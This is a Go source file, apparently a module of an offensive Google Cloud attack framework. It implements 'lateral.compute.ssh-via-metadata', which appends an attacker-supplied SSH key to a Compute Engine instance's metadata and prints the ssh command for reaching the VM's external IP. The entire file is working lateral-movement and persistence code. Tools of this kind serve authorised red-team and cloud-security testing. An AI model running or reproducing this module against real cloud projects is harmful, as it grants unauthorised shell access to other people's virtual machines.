package compute

import (
	"context"
	"fmt"
	"strings"

	computev1 "google.golang.org/api/compute/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&SSHViaMetadata{})
}

// SSHViaMetadata pushes an SSH public key to instance metadata for lateral movement.
type SSHViaMetadata struct{}

func (m *SSHViaMetadata) Info() module.Info {
	return module.Info{
		Name:         "lateral.compute.ssh-via-metadata",
		Tactic:       module.TacticLateral,
		Service:      "compute",
		Description:  "Push SSH key to instance metadata for lateral movement to a VM",
		RequiresAuth: true,
		AttackID:     "T1021.004",
	}
}

func (m *SSHViaMetadata) Run(ctx module.RunContext) error {
	instance := ctx.Flags["instance"]
	zone := ctx.Flags["zone"]
	sshKey := ctx.Flags["ssh-key"]
	username := ctx.Flags["username"]

	if instance == "" || zone == "" || sshKey == "" {
		output.Warn("Usage: run lateral.compute.ssh-via-metadata --instance <name> --zone <zone> --ssh-key <pubkey> [--username <user>]")
		output.Info("Example: --ssh-key 'ssh-rsa AAAA... attacker@host'")
		return nil
	}

	if username == "" {
		username = "nimbus"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	svc, err := computev1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create compute client: %w", err)
	}

	output.Info("Pushing SSH key to %s/%s/%s as user '%s'", project, zone, instance, username)

	inst, err := svc.Instances.Get(project, zone, instance).Do()
	if err != nil {
		return fmt.Errorf("get instance: %w", err)
	}

	// Build the ssh-keys metadata entry.
	newEntry := fmt.Sprintf("%s:%s", username, sshKey)
	metadata := inst.Metadata

	found := false
	for _, item := range metadata.Items {
		if item.Key == "ssh-keys" {
			existing := ""
			if item.Value != nil {
				existing = *item.Value
			}
			combined := strings.TrimRight(existing, "\n") + "\n" + newEntry
			item.Value = &combined
			found = true
			break
		}
	}
	if !found {
		metadata.Items = append(metadata.Items, &computev1.MetadataItems{
			Key:   "ssh-keys",
			Value: &newEntry,
		})
	}

	_, err = svc.Instances.SetMetadata(project, zone, instance, metadata).Do()
	if err != nil {
		return fmt.Errorf("set metadata: %w", err)
	}

	output.Success("SSH key injected for user '%s' on %s", username, instance)

	// Get external IP for convenience.
	for _, iface := range inst.NetworkInterfaces {
		for _, ac := range iface.AccessConfigs {
			if ac.NatIP != "" {
				output.Info("Connect: ssh %s@%s", username, ac.NatIP)
			}
		}
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "lateral.compute.ssh-via-metadata",
			Severity:    module.SevHigh,
			Title:       "SSH key injected via metadata",
			Description: fmt.Sprintf("Pushed SSH key for user %s to %s in %s/%s", username, instance, project, zone),
			Resource:    instance,
			Project:     project,
		}
	}

	return nil
}
